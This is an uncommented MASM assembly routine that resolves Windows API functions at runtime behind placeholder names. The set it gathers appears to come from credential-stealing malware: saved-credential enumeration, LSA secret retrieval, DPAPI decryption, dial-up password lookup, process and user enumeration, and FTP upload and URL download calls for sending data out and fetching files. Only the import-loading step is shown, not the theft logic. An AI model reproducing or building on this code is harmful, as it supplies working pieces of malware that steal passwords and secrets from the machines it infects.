GetImport proc
      LoadLibrary, addr wsock32
      test    eax, eax
      je      FatalError
      mov     dword ptr [hwsock32], eax
      GetProcAddress, hwsock32, addr func21
      test    eax, eax
      je      FatalError
      mov     _htons, eax
      GetProcAddress, hwsock32, addr func22
      test    eax, eax
      je      FatalError
      mov     _inet_addr, eax
      GetProcAddress, hwsock32, addr func23
      test    eax, eax
      je      FatalError
      mov     _gethostname, eax
      GetProcAddress, hwsock32, addr func24
      test    eax, eax
      je      FatalError
      mov     _gethostbyname, eax
      GetProcAddress, hwsock32, addr func25
      test    eax, eax
      je      FatalError
      mov     _connect, eax
      GetProcAddress, hwsock32, addr func26
      test    eax, eax
      je      FatalError
      mov     _closesocket, eax
      GetProcAddress, hwsock32, addr func27
      test    eax, eax
      je      FatalError
      mov     _WSAStartup, eax
      GetProcAddress, hwsock32, addr func28
      test    eax, eax
      je      FatalError
      mov     _socket, eax
      GetProcAddress, hwsock32, addr func29
      test    eax, eax
      je      FatalError
      mov     _send, eax
      GetProcAddress, hwsock32, addr func210
      test    eax, eax
      je      FatalError
      mov     _inet_ntoa, eax
      GetProcAddress, hwsock32, addr func211
      test    eax, eax
      je      FatalError
      mov     _recv, eax

      LoadLibrary, addr wininet
      test    eax, eax
      je      FatalError
      mov     dword ptr [hwininet], eax
      GetProcAddress, hwininet, addr func11
      test    eax, eax
      je      FatalError
      mov     _FtpSetCurrentDirectory, eax
      GetProcAddress, hwininet, addr func12
      test    eax, eax
      je      FatalError
      mov     _InternetOpen, eax
      GetProcAddress, hwininet, addr func13
      test    eax, eax
      je      FatalError
      mov     _FtpPutFile, eax
      GetProcAddress, hwininet, addr func14
      test    eax, eax
      je      FatalError
      mov     _FtpOpenFile, eax
      GetProcAddress, hwininet, addr func15
      test    eax, eax
      je      FatalError
      mov     _InternetConnect, eax
      GetProcAddress, hwininet, addr func16
      test    eax, eax
      je      FatalError
      mov     _InternetCloseHandle, eax
      GetProcAddress, hwininet, addr func17
      test    eax, eax
      je      FatalError
      mov     _FtpCreateDirectory, eax
      GetProcAddress, hwininet, addr func18
      test    eax, eax
      je      FatalError
      mov     _InternetOpenUrl, eax
      GetProcAddress, hwininet, addr func19
      test    eax, eax
      je      FatalError
      mov     _InternetReadFile, eax
      
      LoadLibrary, addr psapi
      test    eax, eax
      je      FatalError
      mov     dword ptr [hpsapi], eax
      GetProcAddress, hpsapi, addr func31
      test    eax, eax
      je      FatalError
      mov     _EnumProcesses, eax
      GetProcAddress, hpsapi, addr func33
      test    eax, eax
      je      FatalError
      mov     _GetModuleFileNameExW, eax
      
      LoadLibrary, addr shell32
      test    eax, eax
      je      FatalError
      mov     dword ptr [hshell], eax
      GetProcAddress, hshell, addr func41
      test    eax, eax
      je      FatalError
      mov     _ShellExecute, eax
      GetProcAddress, hshell, addr func42
      test    eax, eax
      je      FatalError
      mov     _SHGetSpecialFolderPath, eax
      GetProcAddress, hshell, addr func43
      test    eax, eax
      je      FatalError
      mov     _SHGetSpecialFolderPathW, eax
      
      LoadLibrary, addr netapi32
      test    eax, eax
      je      FatalError
      mov     dword ptr [hnetapi32], eax
      GetProcAddress, hnetapi32, addr func51
      test    eax, eax
      je      FatalError
      mov     _NetUserEnum, eax
      GetProcAddress, hnetapi32, addr func52
      test    eax, eax
      je      FatalError
      mov     _NetApiBufferFree, eax
      GetProcAddress, hnetapi32, addr func53
      test    eax, eax
      je      FatalError
      mov     _Netbios, eax
      
      LoadLibrary, addr advapi32
      test    eax, eax
      je      FatalError
      mov     dword ptr [hadvapi32], eax
      GetProcAddress, hadvapi32, addr func61
      test    eax, eax
      je      FatalError
      mov     _GetUserName, eax
      GetProcAddress, hadvapi32, addr func62
      test    eax, eax
      je      FatalError
      mov     _RegCloseKey, eax
      GetProcAddress, hadvapi32, addr func63
      test    eax, eax
      je      FatalError
      mov     _RegEnumKeyEx, eax
      GetProcAddress, hadvapi32, addr func631
      test    eax, eax
      je      FatalError
      mov     _RegEnumKeyExW, eax
      GetProcAddress, hadvapi32, addr func632
      test    eax, eax
      je      FatalError
      mov     _RegEnumValueA, eax
      GetProcAddress, hadvapi32, addr func64
      test    eax, eax
      je      FatalError
      mov     _RegEnumValueW, eax
      GetProcAddress, hadvapi32, addr func65
      test    eax, eax
      je      FatalError
      mov     _RegOpenKeyEx, eax
      GetProcAddress, hadvapi32, addr func651
      test    eax, eax
      je      FatalError
      mov     _RegOpenKeyExW, eax
      GetProcAddress, hadvapi32, addr func66
      test    eax, eax
      je      FatalError
      mov     _RegQueryValueEx, eax
      GetProcAddress, hadvapi32, addr func661
      test    eax, eax
      je      FatalError
      mov     _RegQueryValueExW, eax
      GetProcAddress, hadvapi32, addr func67
      test    eax, eax
      je      FatalError
      mov     _CredEnumerateW, eax
      GetProcAddress, hadvapi32, addr func68
      test    eax, eax
      je      FatalError
      mov     _CredFree, eax
      GetProcAddress, hadvapi32, addr func69
      test    eax, eax
      je      FatalError
      mov     _CryptAcquireContext, eax
      GetProcAddress, hadvapi32, addr func610
      test    eax, eax
      je      FatalError
      mov     _CryptCreateHash, eax
      GetProcAddress, hadvapi32, addr func611
      test    eax, eax
      je      FatalError
      mov     _CryptDestroyHash, eax
      GetProcAddress, hadvapi32, addr func612
      test    eax, eax
      je      FatalError
      mov     _CryptGetHashParam, eax
      GetProcAddress, hadvapi32, addr func613
      test    eax, eax
      je      FatalError
      mov     _CryptHashData, eax
      GetProcAddress, hadvapi32, addr func614
      test    eax, eax
      je      FatalError
      mov     _CryptReleaseContext, eax
      GetProcAddress, hadvapi32, addr func615
      test    eax, eax
      je      FatalError
      mov     _CryptDestroyKey, eax
      GetProcAddress, hadvapi32, addr func616
      test    eax, eax
      je      FatalError
      mov     _CryptEncrypt, eax
      GetProcAddress, hadvapi32, addr func617
      test    eax, eax
      je      FatalError
      mov     _CryptExportKey, eax
      GetProcAddress, hadvapi32, addr func618
      test    eax, eax
      je      FatalError
      mov     _CryptGenKey, eax
      GetProcAddress, hadvapi32, addr func619
      test    eax, eax
      je      FatalError
      mov     _OpenProcessToken, eax
      GetProcAddress, hadvapi32, addr func620
      test    eax, eax
      je      FatalError
      mov     _GetUserNameW, eax
      GetProcAddress, hadvapi32, addr func621
      test    eax, eax
      je      FatalError
      mov     _CryptImportKey, eax
      GetProcAddress, hadvapi32, addr func622
      test    eax, eax
      je      FatalError
      mov     _CryptDecrypt, eax
      GetProcAddress, hadvapi32, addr func623
      test    eax, eax
      je      FatalError
      mov     _LookupAccountName, eax
      GetProcAddress, hadvapi32, addr func624
      test    eax, eax
      je      FatalError
      mov     _LsaRetrievePrivateData, eax
      GetProcAddress, hadvapi32, addr func625
      test    eax, eax
      je      FatalError
      mov     _LsaOpenPolicy, eax
      GetProcAddress, hadvapi32, addr func626
      test    eax, eax
      je      FatalError
      mov     _LsaFreeMemory, eax
      GetProcAddress, hadvapi32, addr func627
      test    eax, eax
      je      FatalError
      mov     _LsaClose, eax
      GetProcAddress, hadvapi32, addr func628
      test    eax, eax
      je      FatalError
      mov     _IsValidSid, eax
      GetProcAddress, hadvapi32, addr func629
      test    eax, eax
      je      FatalError
      mov     _ConvertSidToStringSid, eax
      GetProcAddress, hadvapi32, addr func630
      test    eax, eax
      je      FatalError
      mov     _IsTextUnicode, eax
      
      LoadLibrary, addr shlwapi
      test    eax, eax
      je      FatalError
      mov     dword ptr [hshlwapi], eax
      GetProcAddress, hshlwapi, addr func71
      test    eax, eax
      je      FatalError
      mov     _PathMatchSpec, eax
      GetProcAddress, hshlwapi, addr func72
      test    eax, eax
      je      FatalError
      mov     _PathFindFileName, eax
      GetProcAddress, hshlwapi, addr func73
      test    eax, eax
      je      FatalError
      mov     _PathFindExtension, eax
      GetProcAddress, hshlwapi, addr func74
      test    eax, eax
      je      FatalError
      mov     _StrToIntEx, eax
      GetProcAddress, hshlwapi, addr func78
      test    eax, eax
      je      FatalError
      mov     _StrToIntExW, eax
      GetProcAddress, hshlwapi, addr func75
      test    eax, eax
      je      FatalError
      mov     _PathAddBackslash, eax
      GetProcAddress, hshlwapi, addr func76
      test    eax, eax
      je      FatalError
      mov     _PathFindFileNameW, eax
      GetProcAddress, hshlwapi, addr func77
      test    eax, eax
      je      FatalError
      mov     _PathAddBackslashW, eax
      
      LoadLibrary, addr crypt32
      test    eax, eax
      je      FatalError
      mov     dword ptr [hcrypt32], eax
      GetProcAddress, hcrypt32, addr func81
      test    eax, eax
      je      FatalError
      mov     _CryptUnprotectData, eax
      
      LoadLibrary, addr ole32
      test    eax, eax
      je      FatalError
      mov     dword ptr [hole32], eax
      GetProcAddress, hole32, addr func91
      test    eax, eax
      je      FatalError
      mov     _CoUninitialize, eax
      GetProcAddress, hole32, addr func92
      test    eax, eax
      je      FatalError
      mov     _CoInitialize, eax
      GetProcAddress, hole32, addr func93
      test    eax, eax
      je      FatalError
      mov     _CoCreateInstance, eax
      GetProcAddress, hole32, addr func94
      test    eax, eax
      je      FatalError
      mov     _CoTaskMemFree, eax
      
      LoadLibrary, addr ntdll
      test    eax, eax
      je      FatalError
      mov     dword ptr [hntdll], eax
      GetProcAddress, hntdll, addr func101
      test    eax, eax
      je      FatalError
      mov     _RtlGetCompressionWorkSpaceSize, eax
      GetProcAddress, hntdll, addr func102
      test    eax, eax
      je      FatalError
      mov     _RtlCompressBuffer, eax
      
      LoadLibrary, addr urlmon
      test    eax, eax
      je      FatalError
      mov     dword ptr [hurlmon], eax
      GetProcAddress, hurlmon, addr func111
      test    eax, eax
      je      FatalError
      mov     _URLDownloadToFile, eax
      
      LoadLibrary, addr rasapi32
      test    eax, eax
      je      FatalError
      mov     dword ptr [hrasapi32], eax
      GetProcAddress, hrasapi32, addr func1000
      test    eax, eax
      je      FatalError
      mov     _RasGetEntryDialParams, eax
      GetProcAddress, hrasapi32, addr func1001
      test    eax, eax
      je      FatalError
      mov     _RasEnumEntries, eax
      GetProcAddress, hrasapi32, addr func1002
      test    eax, eax
      je      FatalError
      mov     _RasGetEntryProperties, eax
      
      ret
GetImport endp
